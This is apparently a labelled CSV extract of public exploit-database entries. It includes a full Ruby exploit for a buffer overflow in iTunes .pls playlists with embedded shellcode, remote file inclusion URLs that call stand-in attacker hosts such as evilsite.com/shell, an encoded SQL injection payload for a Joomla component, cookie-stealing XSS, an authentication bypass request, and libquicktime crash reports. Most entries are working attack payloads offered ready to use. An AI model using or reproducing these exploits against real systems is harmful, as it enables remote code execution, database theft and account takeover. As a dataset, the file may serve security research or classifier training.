36837,"Apple iTunes 10.6.1.7 - '.pls' Title Buffer Overflow # Exploit Title: Apple Itunes PLS title buffer overflow # Date: April 26 ,2015 (Day of disclosing this exploit code) # Exploit Author: Fady Mohamed Osman (@fady_osman) # Vendor Homepage: http://www.apple.com # Software Link: http://www.apple.com/itunes/download/?id=890128564 # Version: 10.6.1.7 # Tested on: Windows Xp sp3 # Exploit-db : http://www.exploit-db.com/author/?a=2986 # Youtube : https://www.youtube.com/user/cutehack3r  header = ""[Playlist]\r\n"" header << ""NumberOfEntries=1\r\n"" header << ""File1=http://www.panix.com/web/faq/multimedia/sample.mp3\r\n"" header << ""Title1=""  nseh_longer = ""\xeb\x1E\x90\x90"" nseh_shorter = ""\xeb\x06\x90\x90"" seh = 0x72d119de #pop pop ret from msacm32.drv shell = ""\xdd\xc1\xd9\x74\x24\xf4\xbb\x2b\x2b\x88\x37\x5a\x31\xc9"" + ""\xb1\x33\x83\xea\xfc\x31\x5a\x13\x03\x71\x38\x6a\xc2\x79"" + ""\xd6\xe3\x2d\x81\x27\x94\xa4\x64\x16\x86\xd3\xed\x0b\x16"" + ""\x97\xa3\xa7\xdd\xf5\x57\x33\x93\xd1\x58\xf4\x1e\x04\x57"" + ""\x05\xaf\x88\x3b\xc5\xb1\x74\x41\x1a\x12\x44\x8a\x6f\x53"" + ""\x81\xf6\x80\x01\x5a\x7d\x32\xb6\xef\xc3\x8f\xb7\x3f\x48"" + ""\xaf\xcf\x3a\x8e\x44\x7a\x44\xde\xf5\xf1\x0e\xc6\x7e\x5d"" + ""\xaf\xf7\x53\xbd\x93\xbe\xd8\x76\x67\x41\x09\x47\x88\x70"" + ""\x75\x04\xb7\xbd\x78\x54\xff\x79\x63\x23\x0b\x7a\x1e\x34"" + ""\xc8\x01\xc4\xb1\xcd\xa1\x8f\x62\x36\x50\x43\xf4\xbd\x5e"" + ""\x28\x72\x99\x42\xaf\x57\x91\x7e\x24\x56\x76\xf7\x7e\x7d"" + ""\x52\x5c\x24\x1c\xc3\x38\x8b\x21\x13\xe4\x74\x84\x5f\x06"" + ""\x60\xbe\x3d\x4c\x77\x32\x38\x29\x77\x4c\x43\x19\x10\x7d"" + ""\xc8\xf6\x67\x82\x1b\xb3\x98\xc8\x06\x95\x30\x95\xd2\xa4"" + ""\x5c\x26\x09\xea\x58\xa5\xb8\x92\x9e\xb5\xc8\x97\xdb\x71"" + ""\x20\xe5\x74\x14\x46\x5a\x74\x3d\x25\x3d\xe6\xdd\x84\xd8"" + ""\x8e\x44\xd9"" #1020 --> offset in local exploits  payload = header + ""A"" * 1020 + nseh_shorter + [seh].pack('V') + shell  #380  or 404 (if itunes wasn't already loaded)--> offset in remote ones using the itms protocol. payload_remote =  header + ""A"" * 380 + nseh_longer + [seh].pack('V') + ""A"" * 16 + nseh_shorter + [seh].pack('V') +  shell   # when using as local exploit open('exploit.pls', 'w') { |f|   f.puts payload } puts('local file created')  # place this in a web server and use the itms:// protocol to load it. open('exploit_remote.pls', 'w') { |f|   f.puts payload_remote } puts('remote file created')",Apple iTunes,1
43488,"Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting # Exploit Title: Joomla Plugin Easydiscuss <4.0.21 Persistent XSS in Edit Message # Date: 06-01-2018 # Software Link: https://stackideas.com/easydiscuss # Exploit Author: Mattia Furlani # CVE: CVE-2018-5263 # Category: webapps  1. Description  Whenever a user edits a message with <\textarea> inside the body, everything after the <\textarea> will be executed in the user’s browser. Works with every version up to 4.0.20   2. Proof of Concept  Login with permissions to post a message, insert <\textarea> in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed   3. Solution:  Update to version 4.0.21 https://stackideas.com/blog/easydiscuss4021-update",Joomla! Component Easydiscuss,1
2891,CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion =========================================================================================================== DeltasecurityTEAM www.Deltasecurity.ir =========================================================================================================== * Portal Name : cutenews aj-fork  * Class = Remote File Inclusion ;   * Download =http://mesh.dl.sourceforge.net/sourceforge/ajfork/cn_aj_167.zip  * Found by = DeltahackingTEAM  * User In Delta Team (Tanha )  ---------------------------------------------------------------------------------------------------------- - Vulnerable Code --------------------      include($cutepath.'/inc/plugins.php');  ++++++++++++++++++++++++++++++++++++++++++++  - Exploit:     http://[target]/[Path]/inc/shows.inc.php?cutepath=http://evilsite.com/shell?  ---------------------------------------------------------------------------------------------------------- Sp Tnx For All Admin And All Member EXCEPT DR.TROJAN Sp Tnx For Dr.Pantagon For Learning Find Bug  # milw0rm.com [2006-12-04],CuteNews aj-fork,1
28531,Telekorn Signkorn Guestbook 1.x - '/help/en/adminhelp3.php?dir_path' Remote File Inclusion source: https://www.securityfocus.com/bid/19977/info           Telekorn Signkorn Guestbook is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.           This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.           Versions 1.3 and earlier are affected by this issue.  http://www.example.Com/[Script]/help/en/adminhelp3.php?dir_path=[U r Evil Script] ;,Telekorn Signkorn Guestbook,1
45465,Joomla! Component Music Collection 3.0.3 - SQL Injection # # # # # # Exploit Title: Joomla! Component Music Collection 3.0.3 - SQL Injection # Dork: N/A # Date: 2018-09-24 # Vendor Homepage: http://joomlathat.com/ # Software Link: https://extensions.joomla.org/extensions/extension/multimedia/multimedia-players/music-collection/ # Version: 3.0.3 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2018-17375 # # # # # # Exploit Author: Ihsan Sencan # # # # # # POC:  #  # 1) # http://localhost/[PATH]/index.php/music-collection/playlist-0-on-the-go?task=edit_playlist&id=[SQL] #  # 0%20%4f%52%20%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%28%53%45%4c%45%43%54%20%28%45%4c%54%28%36%36%3d%36%36%2c%31%29%29%29%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29 #   # # # #,Joomla! Component Music Collection,1
2227,"SportsPHool 1.0 - 'mainnav' Remote File Inclusion /* +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -   - - [DEVIL TEAM THE BEST POLISH TEAM] - - + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - SportsPHool <= 1.0 (mainnav) Remote File Include Vulnerability + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - [Script name: SportsPHool v.1.0 - [Script site: http://sourceforge.net/projects/sportsphool + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -          Find by: Kacper (a.k.a Rahim) + -          Contact: kacper1964@yahoo.pl -                        or -          http://www.devilteam.yum.pl/ -                       and -           http://www.rahim.webd.pl/ + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - Special Greetz: DragonHeart ;-) - Ema: Leito, Adam, DeathSpeed, Drzewko, pepi - !@ Przyjazni nie da sie zamienic na marne korzysci @! + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -            Z Dedykacja dla osoby, -         bez ktorej nie mogl bym zyc... -           K.C:* J.M (a.k.a Magaja) + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */ #Exploit:  http://www.site.com/[SportsPHool_path]/includes/layout/plain.footer.php?mainnav=[http://www.myevilsite.com/evil_scripts.txt]  # milw0rm.com [2006-08-20]",SportsPHool,1
23746,"XMB Forum 1.8 - 'editprofile.php?user' Cross-Site Scripting source: https://www.securityfocus.com/bid/9726/info   XMB Forum has been reported prone to multiple cross-site scripting, HTML injection and SQL injection vulnerabilities. The issues present themselves due to insufficient sanitization of remote user supplied data. An attacker may exploit any one of these vulnerabilities to execute arbitrary script code in the browser of an unsuspecting user or to have malicious SQL queries executed in the underlying database.  http://www.example.com/xmb18sp2/editprofile.php?user=x""><%73cript>alert(document.cookie);</%73cript>",XMB Forum,1
27637,"Adobe Document Server 6.0 Extensions - 'AlterCast?op' Cross-Site Scripting source: https://www.securityfocus.com/bid/17500/info   Adobe Document Server for Reader Extensions, included with Graphics Server and Document Server, is prone to multiple vulnerabilities that may allow remote attackers to:   - perform cross-site scripting attacks - gain access to potentially sensitive information - bypass security restrictions to gain administrative access to the application.   Adobe Document Server for Reader Extensions version 6.0, included with Adobe Graphics Server 2.1 and Adobe Document Server 6.0, is vulnerable; other versions may also be affected.  http://www.example.com:8019/altercast/AlterCast?op=[code]",Adobe Document Server for Reader Extensions,1
27324,"Archangel Weblog 0.90.2 - Authentication Bypass source: https://www.securityfocus.com/bid/16848/info  Archangel Weblog is prone to an authentication-bypass vulnerability. This issue is due to a failure in the application to properly validate user-supplied data.   An attacker can exploit this issue to bypass the authentication mechanism and gain access to the affected application as an administrative user. This may facilitate a compromise of the underlying system; other attacks are also possible.  The following example HTTP request is sufficient to exploit this issue: GET http://www.example.com/awb/admin/index.php HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051229 Firefox/1.0.7 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Connection: keep-alive Cookie: ba_admin=1 Cache-Control: max-age=0",Archangel Weblog,1
21436,"B2 0.6 - 'b2edit.showposts.php?b2inc' Remote File Inclusion source: https://www.securityfocus.com/bid/4673/info  B2 is a news/weblog tool written in php. b2 allows webmasters to quickly post news on the frontpage, and let viewers interact with each other. It is available primarily for Unix and Linux.  A variable that is referenced in the PHP scripts does not actually exist. Thus, an attacker may be able to define the value of the variable. By creating a PHP script on the remote side and embedding commands in it, the attacker is able to reference the remote file. This could potentially allow the attacker to execute commands on the vulnerable system.   http://www.vulnerablehost.com/b2/b2-include/b2edit.showposts.php?b2inc=http://www.attacker.com&cmd=ls",B2,1
42148,"libquicktime 1.2.4 - Denial of Service libquicktime multiple vulnerabilities   ================ Author : qflb.wu ===============   Introduction: ============= The libquicktime package contains the libquicktime library, various plugins and codecs, along with graphical and command line utilities used for encoding and decoding QuickTime files. This is useful for reading and writing files in the QuickTime format. The goal of the project is to enhance, while providing compatibility with the Quicktime 4 Linux library.   Affected version: ===== 1.2.4   Vulnerability Description: ========================== ################################## 1. the quicktime_read_moov function in moov.c in libquicktime 1.2.4 can cause a denial of service(infinite loop and CPU consumption) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_read_moov_infinite_loop.mp4   POC: libquicktime_1.2.4_quicktime_read_moov_infinite_loop.mp4 CVE: CVE-2017-9122   ################################### 2. the lqt_frame_duration function in lqt_quicktime.c in libquicktime 1.2.4 can cause a denial of service(invalid memory read and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_lqt_frame_duration_invalid_memory_read.mp4   ASAN:SIGSEGV ================================================================= ==14254==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000004 (pc 0x7f31e6ae7185 sp 0x7ffed033a270 bp 0x0000006bdb50 T0) ==14254==WARNING: Trying to symbolize code, but external symbolizer is not initialized!    #0 0x7f31e6ae7184 (/usr/local/lib/libquicktime.so.0+0x6c184)    #1 0x49b1c6 (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x49b1c6)    #2 0x47fbaa (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47fbaa)    #3 0x7f31e43b2ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #4 0x47f3dc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV ??:0 ?? ==14254==ABORTING   debug info: Program received signal SIGSEGV, Segmentation fault. ... Stopped reason: SIGSEGV 0x00007ffff7829185 in lqt_frame_duration (file=<optimized out>, track=<optimized out>,     constant=<optimized out>) at lqt_quicktime.c:1242 1242  return   POC: libquicktime_1.2.4_lqt_frame_duration_invalid_memory_read.mp4 CVE: CVE-2017-9123   ################################### 3. the quicktime_match_32 in util.c in libquicktime 1.2.4 can cause a denial of service(NULL pointer dereference and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_match_32_NULL_pointer_dereference.mp4   ASAN:SIGSEGV ================================================================= ==14359==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fe8af6b85d8 sp 0x7fff490cd4e0 bp 0x7fff490cd5b0 T0) ==14359==WARNING: Trying to symbolize code, but external symbolizer is not initialized!    #0 0x7fe8af6b85d7 (/usr/local/lib/libquicktime.so.0+0x3605d7)    #1 0x7fe8af68b566 (/usr/local/lib/libquicktime.so.0+0x333566)    #2 0x7fe8af63c71a (/usr/local/lib/libquicktime.so.0+0x2e471a)    #3 0x7fe8af3d1658 (/usr/local/lib/libquicktime.so.0+0x79658)    #4 0x7fe8af3d84a8 (/usr/local/lib/libquicktime.so.0+0x804a8)    #5 0x7fe8af3a95da (/usr/local/lib/libquicktime.so.0+0x515da)    #6 0x47fad2 (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47fad2)    #7 0x7fe8acc8fec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #8 0x47f3dc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV ??:0 ?? ==14359==ABORTING   debug info: Program received signal SIGSEGV, Segmentation fault. Stopped reason: SIGSEGV 0x00007ffff7b1d5d8 in quicktime_match_32 (_input=<optimized out>,     _output=<optimized out>) at util.c:874 874if(input[0] == output[0] &&   POC: libquicktime_1.2.4_quicktime_match_32_NULL_pointer_dereference.mp4 CVE: CVE-2017-9124   ################################### 4. the lqt_frame_duration function in lqt_quicktime.c in libquicktime 1.2.4  can cause a denial of service(heap-buffer-overflow) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_lqt_frame_duration_heap-buffer-overflow.mp4   ================================================================= ==40038==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009cd4 at pc 0x7f28959fc45f bp 0x7ffefd561530 sp 0x7ffefd561528 READ of size 4 at 0x602000009cd4 thread T0    #0 0x7f28959fc45e in lqt_frame_duration /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1242    #1 0x49b1c6 in quicktime_print_info /home/a/Downloads/libquicktime-1.2.4/utils/common.c:138    #2 0x47fbaa in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:996    #3 0x47fbaa in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #4 0x7f28932c7ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #5 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009cd4 is located 3 bytes to the right of 1-byte region [0x602000009cd0,0x602000009cd1) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f2895cad7d0 in quicktime_read_stts /home/a/Downloads/libquicktime-1.2.4/src/stts.c:115   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1242 lqt_frame_duration Shadow bytes around the buggy address:  0x0c047fff9340: fa fa 05 fa fa fa 05 fa fa fa 04 fa fa fa 05 fa  0x0c047fff9350: fa fa 00 fa fa fa 05 fa fa fa 05 fa fa fa 05 fa  0x0c047fff9360: fa fa 05 fa fa fa 00 fa fa fa 05 fa fa fa 05 fa  0x0c047fff9370: fa fa 05 fa fa fa 00 fa fa fa 00 00 fa fa 00 01  0x0c047fff9380: fa fa 04 fa fa fa 05 fa fa fa 00 fa fa fa 05 fa =>0x0c047fff9390: fa fa 05 fa fa fa 00 fa fa fa[01]fa fa fa 00 04  0x0c047fff93a0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==40038==ABORTING   POC: libquicktime_1.2.4_lqt_frame_duration_heap-buffer-overflow.mp4 CVE: CVE-2017-9125   ################################### 5. the quicktime_read_dref_table function in dref.c in libquicktime 1.2.4 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_read_dref_table_heap-buffer-overflow.mp4   ================================================================= ==41637==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009ce4 at pc 0x7f9cb9ad16e7 bp 0x7ffcf9a1e720 sp 0x7ffcf9a1e718 WRITE of size 1 at 0x602000009ce4 thread T0    #0 0x7f9cb9ad16e6 in quicktime_read_dref_table /home/a/Downloads/libquicktime-1.2.4/src/dref.c:69    #1 0x7f9cb9ad3bdd in quicktime_read_dref /home/a/Downloads/libquicktime-1.2.4/src/dref.c:147    #2 0x7f9cb9ad0388 in quicktime_read_dinf /home/a/Downloads/libquicktime-1.2.4/src/dinf.c:56    #3 0x7f9cb9afdf09 in quicktime_read_minf /home/a/Downloads/libquicktime-1.2.4/src/minf.c:220    #4 0x7f9cb9afaa9e in quicktime_read_mdia /home/a/Downloads/libquicktime-1.2.4/src/mdia.c:155    #5 0x7f9cb9b4ff1e in quicktime_read_trak /home/a/Downloads/libquicktime-1.2.4/src/trak.c:247    #6 0x7f9cb9b0172a in quicktime_read_moov /home/a/Downloads/libquicktime-1.2.4/src/moov.c:221    #7 0x7f9cb9896658 in quicktime_read_info /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1791    #8 0x7f9cb989d4a8 in do_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2026    #9 0x7f9cb986e5da in quicktime_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2075    #10 0x47fad2 in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:987    #11 0x47fad2 in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #12 0x7f9cb7154ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #13 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009ce4 is located 12 bytes to the left of 1-byte region [0x602000009cf0,0x602000009cf1) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f9cb9ad13ba in quicktime_read_dref_table /home/a/Downloads/libquicktime-1.2.4/src/dref.c:66   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/dref.c:69 quicktime_read_dref_table Shadow bytes around the buggy address:  0x0c047fff9340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c047fff9390: fa fa fa fa fa fa fa fa fa fa fa fa[fa]fa 01 fa  0x0c047fff93a0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==41637==ABORTING   POC: libquicktime_1.2.4_quicktime_read_dref_table_heap-buffer-overflow.mp4 CVE: CVE-2017-9126   ################################### 6. the quicktime_user_atoms_read_atom function in useratoms.c in libquicktime 1.2.4 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_user_atoms_read_atom_heap-buffer-overflow.mp4   ================================================================= ==41642==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009cb1 at pc 0x7f3aa15d47f3 bp 0x7ffc98430d00 sp 0x7ffc98430cf8 WRITE of size 1 at 0x602000009cb1 thread T0    #0 0x7f3aa15d47f2 in quicktime_user_atoms_read_atom /home/a/Downloads/libquicktime-1.2.4/src/useratoms.c:84    #1 0x7f3aa1590bd8 in quicktime_read_stsd_video /home/a/Downloads/libquicktime-1.2.4/src/stsdtable.c:557    #2 0x7f3aa1594eb8 in quicktime_read_stsd_table /home/a/Downloads/libquicktime-1.2.4/src/stsdtable.c:694    #3 0x7f3aa158bd4d in quicktime_finalize_stsd /home/a/Downloads/libquicktime-1.2.4/src/stsd.c:336    #4 0x7f3aa1566147 in quicktime_read_minf /home/a/Downloads/libquicktime-1.2.4/src/minf.c:231    #5 0x7f3aa1562a9e in quicktime_read_mdia /home/a/Downloads/libquicktime-1.2.4/src/mdia.c:155    #6 0x7f3aa15b7f1e in quicktime_read_trak /home/a/Downloads/libquicktime-1.2.4/src/trak.c:247    #7 0x7f3aa156972a in quicktime_read_moov /home/a/Downloads/libquicktime-1.2.4/src/moov.c:221    #8 0x7f3aa12fe658 in quicktime_read_info /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1791    #9 0x7f3aa13054a8 in do_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2026    #10 0x7f3aa12d65da in quicktime_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2075    #11 0x47fad2 in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:987    #12 0x47fad2 in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #13 0x7f3a9ebbcec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #14 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009cb1 is located 0 bytes to the right of 1-byte region [0x602000009cb0,0x602000009cb1) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f3aa15d451a in quicktime_user_atoms_read_atom /home/a/Downloads/libquicktime-1.2.4/src/useratoms.c:81   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/useratoms.c:84 quicktime_user_atoms_read_atom Shadow bytes around the buggy address:  0x0c047fff9340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c047fff9390: fa fa fa fa fa fa[01]fa fa fa 00 fa fa fa 00 04  0x0c047fff93a0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==41642==ABORTING   POC: libquicktime_1.2.4_quicktime_user_atoms_read_atom_heap-buffer-overflow.mp4 CVE: CVE-2017-9127   ################################### 7. the quicktime_video_width function in lqt_quicktime.c in libquicktime 1.2.4 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_video_width_heap-buffer-overflow.mp4   ================================================================= ==10979==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009d00 at pc 0x7f36a1017a37 bp 0x7ffe65a90010 sp 0x7ffe65a90008 READ of size 4 at 0x602000009d00 thread T0    #0 0x7f36a1017a36 in quicktime_video_width /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:998    #1 0x7f36a1017a36 in quicktime_init_maps /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1633    #2 0x7f36a101af13 in quicktime_read_info /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1891    #3 0x7f36a10204a8 in do_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2026    #4 0x7f36a0ff15da in quicktime_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2075    #5 0x47fad2 in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:987    #6 0x47fad2 in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #7 0x7f369e8d7ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #8 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009d00 is located 4 bytes to the right of 12-byte region [0x602000009cf0,0x602000009cfc) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f36a12543ba in quicktime_read_dref_table /home/a/Downloads/libquicktime-1.2.4/src/dref.c:66   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:998 quicktime_video_width Shadow bytes around the buggy address:  0x0c047fff9350: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x0c047fff9360: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x0c047fff9370: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd  0x0c047fff9380: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fa  0x0c047fff9390: fa fa fd fa fa fa fd fa fa fa 01 fa fa fa 00 04 =>0x0c047fff93a0:[fa]fa 00 04 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa  0x0c047fff93f0: fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==10979==ABORTING   POC: libquicktime_1.2.4_quicktime_video_width_heap-buffer-overflow.mp4 CVE: CVE-2017-9128     =================================   qflb.wu () dbappsecurity com cn   Proofs of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42148.zip",libquicktime,1
